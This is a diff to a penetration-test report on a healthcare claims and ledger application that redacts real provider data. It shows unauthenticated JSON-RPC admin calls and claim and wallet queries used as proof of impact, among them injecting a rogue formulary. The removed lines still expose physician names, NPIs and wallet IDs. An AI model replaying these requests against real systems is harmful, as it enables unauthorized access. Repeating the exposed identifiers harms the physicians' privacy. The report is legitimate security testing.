@@ -7,6 +7,8 @@
 **Assessment Date:** 2026-04-03  
 **Scope:** Authentication, Authorization, XSS, SQL and Command Injection, SSRF, and general application security testing
 
+**Redactions (2026-10-19):** the seed providers were real NPPES records when this assessment ran. Their names, NPIs and wallet IDs are redacted below (seed prescribers by row number, `<seed-prescriber-0-wallet-id>`, `<seed-pharmacy-0-wallet-id>`), and the seed providers have since been replaced with fictional ones.
+
 ### Summary by Vulnerability Type
 
 **Authentication Vulnerabilities:**
@@ -298,7 +300,7 @@ curl -s -X POST http://host.docker.internal:3030/rpc \
 **Proof of Impact:**
 
 - `l2_forceBatch` returned `{"jsonrpc":"2.0","id":1,"result":null}` — admin batch forced with no credentials
-- `l2_requestSnapshot` returned full system state including: 31 registered wallets, provider registry with real physician names/NPIs (Dr. ANAS ABED NPI 1659002566, Dr. VIDTHYA ABRAHAM NPI 1861836058, etc.), pharmacy provider wallets, formulary data, and all chain state
+- `l2_requestSnapshot` returned full system state including: 31 registered wallets, provider registry with real physician names/NPIs (seed prescribers 0 and 1 by name and NPI, etc.; redacted 2026-10-19, and the seed providers have since been replaced with fictional ones), pharmacy provider wallets, formulary data, and all chain state
 - `l2_storeFormulary` returned `{"success":true,"planIdHash":"EXPLOIT-PLAN-001"}` — rogue formulary injected
 - `POST /viz/emit` returned `{"ok":true,"id":"viz-000009"}` — admin viz endpoint bypassed
 - All 13 admin methods affected: `l2_forceBatch`, `l2_storeFormulary`, `l2_storePlan`, `l2_deletePlan`, `l2_registerEntity`, `l2_credentialProvider`, `l2_updateProviderStatus`, `l2_requestSnapshot`, `l2_gossipRelay`, `l2_recordFill`, `l2_publishPlanOverlay`, `l2_revokeAdminKey`, `l2_approveAdmission`
@@ -1315,12 +1317,12 @@ HTTP 200 returned. The endpoint executed with zero authentication. No authorizat
 
 2. Query any prescriber's claims:
    ```
-   GET http://host.docker.internal:4004/claims/prescriber/9489398473621007280930918963229247780547232424938614459053984641185807880161
+   GET http://host.docker.internal:4004/claims/prescriber/<seed-prescriber-0-wallet-id>
    ```
 
 3. Query any pharmacy's claims:
    ```
-   GET http://host.docker.internal:4004/claims/pharmacy/7801201308536363238740125484742137672162917955699986955841384804642161121648
+   GET http://host.docker.internal:4004/claims/pharmacy/<seed-pharmacy-0-wallet-id>
    ```
 
 **Proof of Impact:** All three claim endpoints return HTTP 200 `{"ok":true,"data":[]}` with no authentication headers. No 401/403 returned regardless of the wallet ID supplied. The absence of authorization controls is confirmed across all three claim roles (member, prescriber, pharmacy).
@@ -1396,7 +1398,7 @@ HTTP 200 returned. The endpoint executed with zero authentication. No authorizat
    POST http://host.docker.internal:3030/rpc
    Content-Type: application/json
 
-   {"jsonrpc":"2.0","method":"l2_getWalletState","params":{"walletId":"9489398473621007280930918963229247780547232424938614459053984641185807880161"},"id":1}
+   {"jsonrpc":"2.0","method":"l2_getWalletState","params":{"walletId":"<seed-prescriber-0-wallet-id>"},"id":1}
    ```
 
 2. Query claims for any wallet:
@@ -1412,7 +1414,7 @@ HTTP 200 returned. The endpoint executed with zero authentication. No authorizat
 `l2_getWalletState` returned wallet state data for the prescriber node wallet without any authentication:
 ```json
 {
-  "walletId": "9489398473621007280930918963229247780547232424938614459053984641185807880161",
+  "walletId": "<seed-prescriber-0-wallet-id>",
   "credentialInventoryRoot": "15433636137932294330522564897643259724602670702144398296133714241278885195605",
   "nonce": "0"
 }
